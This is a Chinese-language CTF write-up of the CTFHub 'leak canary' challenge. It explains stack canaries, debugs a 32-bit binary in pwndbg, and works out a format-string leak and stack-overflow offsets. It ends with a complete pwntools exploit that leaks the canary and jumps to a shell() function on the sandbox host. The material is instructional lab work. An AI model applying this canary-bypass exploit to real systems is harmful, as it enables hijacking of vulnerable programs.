---
title: CTFHUB leak canary
date: 2025-04-09 22:19:00
tags:
  - CTF
  - pwn
  - 信息安全
categories:
  - CTF
  - pwn
---

<meta name="referrer" content="no-referrer">


# leak canary wp

## 一、canary

`Canary`（金丝雀）是一种用来检测程序中栈溢出漏洞的保护机制。 想象一下矿工带着金丝雀下矿。金丝雀对有毒气体非常敏感，如果矿井里有毒气体泄漏，金丝雀会先死去，从而提醒矿工撤离，保护矿工的安全。

在计算机安全领域，`Canary` 的作用类似：

- 在函数调用之前，在栈上放置一个随机的“金丝雀”值。 这个值是程序在运行过程中随机生成的，攻击者很难猜到。

- 在函数返回之前，检查栈上的“金丝雀”值是否被改变。 如果发生了栈溢出，攻击者很可能覆盖了栈上的金丝雀值。

- 如果“金丝雀”值被改变，说明可能发生了栈溢出。 此时，程序会立即终止，防止攻击者利用栈溢出执行恶意代码。




简单来说，`Canary`就像一个陷阱：

陷阱： 金丝雀值。
触发陷阱的条件： 栈溢出，导致金丝雀值被覆盖。
后果： 程序终止，防止恶意攻击。



## 二、解题思路

### 静态分析

先使用`file`以及`checksec`命令查看一下文件信息

![](https://gitee.com/ttovlove/images/raw/master/images/CTFHUB/leak%20canary/2.png)

`32`位的`elf`文件

使用`ida32`打开分析

![](https://gitee.com/ttovlove/images/raw/master/images/CTFHUB/leak%20canary/3.png)

`main`函数很简单，调用了`vuln()`函数，接着跟进`vuln()`函数

![](https://gitee.com/ttovlove/images/raw/master/images/CTFHUB/leak%20canary/4.png)

这里存在两个漏洞

一个明显的**栈溢出漏洞**，`read`读取了`0x200`的数据，但是`buf`的长度只有`100`字节

一个**格式化字符串漏洞**:`printf(buf)`: 使用 `printf()` 函数将 `buf` 的内容输出到标准输出。 这是格式化字符串漏洞发生的关键点。 `printf()` 函数会根据 `buf` 中的格式化字符串（例如 `%x`, `%s`, `%n`）来解析和输出数据。 如果 `buf` 中包含恶意的格式化字符串，攻击者可以读取栈上的数据、写入内存，甚至控制程序的执行流程。

```
正确的使用使用方法：printf("%s", buf) 
格式化字符串漏洞：  printf(buf)
```

另外还发现了一个后门函数`shell()`

![](https://gitee.com/ttovlove/images/raw/master/images/CTFHUB/leak%20canary/5.png)

到这里我们也了解了程序的逻辑：进行两次输入输出

到目前的思路就是：

第一次输入利用格式化字符串漏洞泄露`canary`的值

第二次输入利用栈溢出漏洞控制程序执行`shell()`，从而`getshell`，同时要保证填充足够的数据确保`canary`的值不被覆盖



### 动态调试

接下来使用`pwndbg`调试，找出`canary`的偏移

```bash
moon@moon-virtual-machine:~/桌面$ gdb -q '/home/moon/桌面/pwn/leak/pwn' 
pwndbg: loaded 187 pwndbg commands and 45 shell commands. Type pwndbg [--shell | --all] [filter] for a list.
pwndbg: created $rebase, $base, $hex2ptr, $argv, $envp, $argc, $environ, $bn_sym, $bn_var, $bn_eval, $ida GDB functions (can be used with print/break)
Reading symbols from /home/moon/桌面/pwn/leak/pwn...
(No debugging symbols found in /home/moon/桌面/pwn/leak/pwn)
------- tip of the day (disable with set show-tips off) -------
Calling functions like call (void)puts("hello world") will run all other target threads for the time the function runs. Use set scheduler-locking on to lock the execution to current thread when calling functions
pwndbg> show b
Ambiguous show command "b": backtrace, backtrace-address-color, backtrace-frame-label, backtrace-frame-label-color...
pwndbg> info func
All defined functions:

Non-debugging symbols:
0x080483d4  _init
0x08048410  setbuf@plt
0x08048420  read@plt
0x08048430  printf@plt
0x08048440  __stack_chk_fail@plt
0x08048450  puts@plt
0x08048460  system@plt
0x08048470  __libc_start_main@plt
0x08048480  __gmon_start__@plt
0x08048490  _start
0x080484d0  _dl_relocate_static_pie
0x080484e0  __x86.get_pc_thunk.bx
0x080484f0  deregister_tm_clones
0x08048530  register_tm_clones
0x08048570  __do_global_dtors_aux
0x080485a0  frame_dummy
0x080485a6  shell
0x080485d1  init
0x0804862b  vuln
0x08048697  main
0x080486dc  __x86.get_pc_thunk.ax
0x080486e0  __libc_csu_init
0x08048740  __libc_csu_fini
0x08048750  __stack_chk_fail_local
0x08048764  _fini
pwndbg> disas vuln
Ambiguous command "disas vuln": disasm, disassemble.
pwndbg> disassemble vuln
Dump of assembler code for function vuln:
   0x0804862b <+0>:	push   ebp
   0x0804862c <+1>:	mov    ebp,esp
   0x0804862e <+3>:	push   ebx
   0x0804862f <+4>:	sub    esp,0x74
   0x08048632 <+7>:	call   0x80484e0 <__x86.get_pc_thunk.bx>
   0x08048637 <+12>:	add    ebx,0x19c9
   0x0804863d <+18>:	mov    eax,gs:0x14
   0x08048643 <+24>:	mov    DWORD PTR [ebp-0xc],eax
   0x08048646 <+27>:	xor    eax,eax
   0x08048648 <+29>:	mov    DWORD PTR [ebp-0x74],0x0
   0x0804864f <+36>:	jmp    0x804867a <vuln+79>
   0x08048651 <+38>:	sub    esp,0x4
   0x08048654 <+41>:	push   0x200
   0x08048659 <+46>:	lea    eax,[ebp-0x70]
   0x0804865c <+49>:	push   eax
   0x0804865d <+50>:	push   0x0
   0x0804865f <+52>:	call   0x8048420 <read@plt>
   0x08048664 <+57>:	add    esp,0x10
   0x08048667 <+60>:	sub    esp,0xc
   0x0804866a <+63>:	lea    eax,[ebp-0x70]
   0x0804866d <+66>:	push   eax
   0x0804866e <+67>:	call   0x8048430 <printf@plt>
   0x08048673 <+72>:	add    esp,0x10
   0x08048676 <+75>:	add    DWORD PTR [ebp-0x74],0x1
   0x0804867a <+79>:	cmp    DWORD PTR [ebp-0x74],0x1
   0x0804867e <+83>:	jle    0x8048651 <vuln+38>
   0x08048680 <+85>:	nop
   0x08048681 <+86>:	mov    eax,DWORD PTR [ebp-0xc]
   0x08048684 <+89>:	xor    eax,DWORD PTR gs:0x14
   0x0804868b <+96>:	je     0x8048692 <vuln+103>
   0x0804868d <+98>:	call   0x8048750 <__stack_chk_fail_local>
   0x08048692 <+103>:	mov    ebx,DWORD PTR [ebp-0x4]
   0x08048695 <+106>:	leave  
   0x08048696 <+107>:	ret    
End of assembler dump.
pwndbg> b *vuln+52
Breakpoint 1 at 0x804865f
pwndbg> r
Starting program: /home/moon/桌面/pwn/leak/pwn 
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
Welcome to CTFHub leak canary.Input someting:

Breakpoint 1, 0x0804865f in vuln ()
Warning: Avoided exploring possible address 0xfffdbce8.
You can explicitly explore it with `vmmap_explore 0xfffdb000`
LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
─────────────[ REGISTERS / show-flags off / show-compact-regs off ]─────────────
 EAX  0xffffd138 ◂— 1
 EBX  0x804a000 (_GLOBAL_OFFSET_TABLE_) —▸ 0x8049f08 (_DYNAMIC) ◂— 1
 ECX  0xf7fa49b4 (_IO_stdfile_1_lock) ◂— 0
 EDX  1
 EDI  0xf7ffcb80 (_rtld_global_ro) ◂— 0
 ESI  0xffffd284 —▸ 0xffffd435 ◂— 0x6d6f682f ('/hom')
 EBP  0xffffd1a8 —▸ 0xffffd1b8 —▸ 0xf7ffd020 (_rtld_global) —▸ 0xf7ffda40 ◂— 0
 ESP  0xffffd120 ◂— 0
 EIP  0x804865f (vuln+52) —▸ 0xfffdbce8 ◂— 0xfffdbce8
───────────────────────[ DISASM / i386 / set emulate on ]───────────────────────
 ► 0x804865f <vuln+52>    call   read@plt                    <read@plt>
        fd: 0 (/dev/pts/2)
        buf: 0xffffd138 ◂— 1
        nbytes: 0x200
 
   0x8048664 <vuln+57>    add    esp, 0x10
   0x8048667 <vuln+60>    sub    esp, 0xc
   0x804866a <vuln+63>    lea    eax, [ebp - 0x70]
   0x804866d <vuln+66>    push   eax
   0x804866e <vuln+67>    call   printf@plt                  <printf@plt>
 
   0x8048673 <vuln+72>    add    esp, 0x10
   0x8048676 <vuln+75>    add    dword ptr [ebp - 0x74], 1
   0x804867a <vuln+79>    cmp    dword ptr [ebp - 0x74], 1
   0x804867e <vuln+83>    jle    vuln+38                     <vuln+38>
 
   0x8048680 <vuln+85>    nop    
───────────────────────────────────[ STACK ]────────────────────────────────────
00:0000│ esp 0xffffd120 ◂— 0
01:0004│-084 0xffffd124 —▸ 0xffffd138 ◂— 1
02:0008│-080 0xffffd128 ◂— 0x200
03:000c│-07c 0xffffd12c —▸ 0x8048637 (vuln+12) ◂— add ebx, 0x19c9
04:0010│-078 0xffffd130 —▸ 0xf7fa3da0 (_IO_2_1_stdout_) ◂— 0xfbad2887
05:0014│-074 0xffffd134 ◂— 0
06:0018│ eax 0xffffd138 ◂— 1
07:001c│-06c 0xffffd13c —▸ 0x804829c ◂— add byte ptr [ecx + ebp*2 + 0x62], ch
─────────────────────────────────[ BACKTRACE ]──────────────────────────────────
 ► 0 0x804865f vuln+52
   1 0x80486cd main+54
   2 0xf7d9a519 __libc_start_call_main+121
   3 0xf7d9a5f3 __libc_start_main+147
   4 0x80484c2 _start+50
────────────────────────────────────────────────────────────────────────────────
pwndbg> n
aaaaaa
0x08048664 in vuln ()
LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
─────────────[ REGISTERS / show-flags off / show-compact-regs off ]─────────────
*EAX  7
 EBX  0x804a000 (_GLOBAL_OFFSET_TABLE_) —▸ 0x8049f08 (_DYNAMIC) ◂— 1
*ECX  0xffffd138 ◂— 0x61616161 ('aaaa')
*EDX  0x200
 EDI  0xf7ffcb80 (_rtld_global_ro) ◂— 0
 ESI  0xffffd284 —▸ 0xffffd435 ◂— 0x6d6f682f ('/hom')
 EBP  0xffffd1a8 —▸ 0xffffd1b8 —▸ 0xf7ffd020 (_rtld_global) —▸ 0xf7ffda40 ◂— 0
 ESP  0xffffd120 ◂— 0
*EIP  0x8048664 (vuln+57) ◂— add esp, 0x10
───────────────────────[ DISASM / i386 / set emulate on ]───────────────────────
   0x804865f <vuln+52>    call   read@plt                    <read@plt>
 
 ► 0x8048664 <vuln+57>    add    esp, 0x10             ESP => 0xffffd130 (0xffffd120 + 0x10)
   0x8048667 <vuln+60>    sub    esp, 0xc              ESP => 0xffffd124 (0xffffd130 - 0xc)
   0x804866a <vuln+63>    lea    eax, [ebp - 0x70]     EAX => 0xffffd138 ◂— 0x61616161 ('aaaa')
   0x804866d <vuln+66>    push   eax
   0x804866e <vuln+67>    call   printf@plt                  <printf@plt>
 
   0x8048673 <vuln+72>    add    esp, 0x10
   0x8048676 <vuln+75>    add    dword ptr [ebp - 0x74], 1
   0x804867a <vuln+79>    cmp    dword ptr [ebp - 0x74], 1
   0x804867e <vuln+83>    jle    vuln+38                     <vuln+38>
 
   0x8048680 <vuln+85>    nop    
───────────────────────────────────[ STACK ]────────────────────────────────────
00:0000│ esp 0xffffd120 ◂— 0
01:0004│-084 0xffffd124 —▸ 0xffffd138 ◂— 0x61616161 ('aaaa')
02:0008│-080 0xffffd128 ◂— 0x200
03:000c│-07c 0xffffd12c —▸ 0x8048637 (vuln+12) ◂— add ebx, 0x19c9
04:0010│-078 0xffffd130 —▸ 0xf7fa3da0 (_IO_2_1_stdout_) ◂— 0xfbad2887
05:0014│-074 0xffffd134 ◂— 0
06:0018│ ecx 0xffffd138 ◂— 0x61616161 ('aaaa')
07:001c│-06c 0xffffd13c ◂— 0x80a6161
─────────────────────────────────[ BACKTRACE ]──────────────────────────────────
 ► 0 0x8048664 vuln+57
   1 0x80486cd main+54
   2 0xf7d9a519 __libc_start_call_main+121
   3 0xf7d9a5f3 __libc_start_main+147
   4 0x80484c2 _start+50
────────────────────────────────────────────────────────────────────────────────
pwndbg> stack 0x25
00:0000│ esp 0xffffd120 ◂— 0
01:0004│-084 0xffffd124 —▸ 0xffffd138 ◂— 0x61616161 ('aaaa')
02:0008│-080 0xffffd128 ◂— 0x200
03:000c│-07c 0xffffd12c —▸ 0x8048637 (vuln+12) ◂— add ebx, 0x19c9
04:0010│-078 0xffffd130 —▸ 0xf7fa3da0 (_IO_2_1_stdout_) ◂— 0xfbad2887
05:0014│-074 0xffffd134 ◂— 0
06:0018│ ecx 0xffffd138 ◂— 0x61616161 ('aaaa')
07:001c│-06c 0xffffd13c ◂— 0x80a6161
08:0020│-068 0xffffd140 —▸ 0x804a00c (setbuf@got[plt]) —▸ 0xf7df2f70 (setbuf) ◂— endbr32 
09:0024│-064 0xffffd144 ◂— 0x20 /* ' ' */
0a:0028│-060 0xffffd148 —▸ 0xf7df849d (__overflow+13) ◂— add ebx, 0x1aab63
0b:002c│-05c 0xffffd14c —▸ 0xf7fa1a60 (_IO_file_jumps) ◂— 0
0c:0030│-058 0xffffd150 —▸ 0xf7fa3da0 (_IO_2_1_stdout_) ◂— 0xfbad2887
0d:0034│-054 0xffffd154 —▸ 0xf7fa3000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x229dac
0e:0038│-050 0xffffd158 —▸ 0xffffd198 —▸ 0xffffd1b8 —▸ 0xf7ffd020 (_rtld_global) —▸ 0xf7ffda40 ◂— ...
0f:003c│-04c 0xffffd15c —▸ 0xf7dec42b (puts+395) ◂— add esp, 0x10
10:0040│-048 0xffffd160 —▸ 0xf7fa3da0 (_IO_2_1_stdout_) ◂— 0xfbad2887
11:0044│-044 0xffffd164 ◂— 0xa /* '\n' */
12:0048│-040 0xffffd168 ◂— 0x2d /* '-' */
13:004c│-03c 0xffffd16c —▸ 0xf7df2f89 (setbuf+25) ◂— add esp, 0x1c
14:0050│-038 0xffffd170 —▸ 0xf7fa3d00 (_IO_2_1_stderr_) ◂— 0xfbad2087
15:0054│-034 0xffffd174 ◂— 0x7d4
16:0058│-030 0xffffd178 —▸ 0xf7fa3e3c (stdout) —▸ 0xf7fa3da0 (_IO_2_1_stdout_) ◂— 0xfbad2887
17:005c│-02c 0xffffd17c ◂— 0x2d /* '-' */
18:0060│-028 0xffffd180 —▸ 0xffffd1b8 —▸ 0xf7ffd020 (_rtld_global) —▸ 0xf7ffda40 ◂— 0
19:0064│-024 0xffffd184 —▸ 0xf7fd9004 (_dl_runtime_resolve+20) ◂— pop edx
1a:0068│-020 0xffffd188 —▸ 0xf7fa49a8 (_IO_stdfile_2_lock) ◂— 0
1b:006c│-01c 0xffffd18c —▸ 0x804a000 (_GLOBAL_OFFSET_TABLE_) —▸ 0x8049f08 (_DYNAMIC) ◂— 1
1c:0070│-018 0xffffd190 —▸ 0xffffd284 —▸ 0xffffd435 ◂— 0x6d6f682f ('/hom')
1d:0074│-014 0xffffd194 —▸ 0xf7ffcb80 (_rtld_global_ro) ◂— 0
1e:0078│-010 0xffffd198 —▸ 0xffffd1b8 —▸ 0xf7ffd020 (_rtld_global) —▸ 0xf7ffda40 ◂— 0
1f:007c│-00c 0xffffd19c ◂— 0x7fcb5b00
20:0080│-008 0xffffd1a0 —▸ 0x8048788 ◂— push edi /* 'Welcome to CTFHub leak canary.Input someting:' */
21:0084│-004 0xffffd1a4 —▸ 0x804a000 (_GLOBAL_OFFSET_TABLE_) —▸ 0x8049f08 (_DYNAMIC) ◂— 1
22:0088│ ebp 0xffffd1a8 —▸ 0xffffd1b8 —▸ 0xf7ffd020 (_rtld_global) —▸ 0xf7ffda40 ◂— 0
23:008c│+004 0xffffd1ac —▸ 0x80486cd (main+54) ◂— mov eax, 0
24:0090│+008 0xffffd1b0 —▸ 0xffffd1d0 ◂— 1
pwndbg> x/50wx $esp
0xffffd120:	0x00000000	0xffffd138	0x00000200	0x08048637
0xffffd130:	0xf7fa3da0	0x00000000	0x61616161	0x080a6161
0xffffd140:	0x0804a00c	0x00000020	0xf7df849d	0xf7fa1a60
0xffffd150:	0xf7fa3da0	0xf7fa3000	0xffffd198	0xf7dec42b
0xffffd160:	0xf7fa3da0	0x0000000a	0x0000002d	0xf7df2f89
0xffffd170:	0xf7fa3d00	0x000007d4	0xf7fa3e3c	0x0000002d
0xffffd180:	0xffffd1b8	0xf7fd9004	0xf7fa49a8	0x0804a000
0xffffd190:	0xffffd284	0xf7ffcb80	0xffffd1b8	0x7fcb5b00
0xffffd1a0:	0x08048788	0x0804a000	0xffffd1b8	0x080486cd
0xffffd1b0:	0xffffd1d0	0xf7fa3000	0xf7ffd020	0xf7d9a519
0xffffd1c0:	0xffffd435	0x00000070	0xf7ffd000	0xf7d9a519
0xffffd1d0:	0x00000001	0xffffd284	0xffffd28c	0xffffd1f0
0xffffd1e0:	0xf7fa3000	0x08048697

```

**关键点**：

在输入出下断点

![](https://gitee.com/ttovlove/images/raw/master/images/CTFHUB/leak%20canary/8.png)

![](https://gitee.com/ttovlove/images/raw/master/images/CTFHUB/leak%20canary/9.png)

然后单步调试

在输入后查看栈中的结构

![](https://gitee.com/ttovlove/images/raw/master/images/CTFHUB/leak%20canary/10.png)



#### 计算canary偏移

通过分析GDB调试数据，确定`canary`到栈顶的偏移步骤如下：

从`vuln`函数汇编代码可见：

```asm
0x0804863d <+18>: mov    eax,gs:0x14         ; 加载canary值到eax
0x08048643 <+24>: mov    DWORD PTR [ebp-0xc],eax ; 将canary存入[ebp-0xc]
```

**canary存储位置**：`ebp - 0xc`

![](https://gitee.com/ttovlove/images/raw/master/images/CTFHUB/leak%20canary/12.png)

查看此时栈中的`canary`值为`0x7fcb5b00`

接着查看从 `$esp` (栈顶) 指向的地址开始栈中的内容

![](https://gitee.com/ttovlove/images/raw/master/images/CTFHUB/leak%20canary/11.png)

```
x/50wx $esp #32位程序用wx，栈顶指针为esp
x/50gx $rsp #64位程序用gx，栈顶指针为rsp
```

发现此时`canary`到栈顶指针`$esp`的偏移是`31`(`0x1f`)(从`0x00000000`开始数)

`%31$x` 用于从栈中读取位于偏移量 `31` 的数据，并将其以十六进制格式输出。

所以可以用`%31$x`来以`16`进制格式输出无`0x`开头的字符串，拿到`canary`后将其转换为`int`型



#### 确定填充

首先确定输入缓冲区的起始地址

`read`函数的缓冲区参数为`lea eax,[ebp-0x70]`：

```asm
0x08048659 <+46>: lea    eax,[ebp-0x70]       ; buf起始地址 = ebp-0x70
```

**缓冲区起始地址**：`ebp - 0x70`

计算`canary`到缓冲区的偏移

```asm
canary_offset = (ebp - 0xc) - (ebp - 0x70) = 0x64 (十进制100)
```

所以输入缓冲区到`canary`的偏移为 **100字节**



所以`payload`的构造应该是先填充`100`字节的数据，接着是泄露的`canary`地址，因为`canary`到`ebp`还有`0xc`的距离，所以还要填充`0xc`的数据覆盖`$ebp`，再接上`shell()`的地址，让程序跳转执行`shell()`

```python
payload = b'a' * 100 + p32(canary_addr) + b'a' * 0xc + p32(shell_addr)
```



### exp:

```
from pwn import *

io = remote('challenge-e5ed5c2a0199ee62.sandbox.ctfhub.com',31006)
shell_addr = 0x080485A6

io.recvline()
io.sendline(b'%31$x')
canary_addr = int(io.recv(8),16)

payload = b'a' * 100 + p32(canary_addr) + b'a' * 0xc + p32(shell_addr)
io.sendline(payload)
io.interactive()
```



![](https://gitee.com/ttovlove/images/raw/master/images/CTFHUB/leak%20canary/1.png)
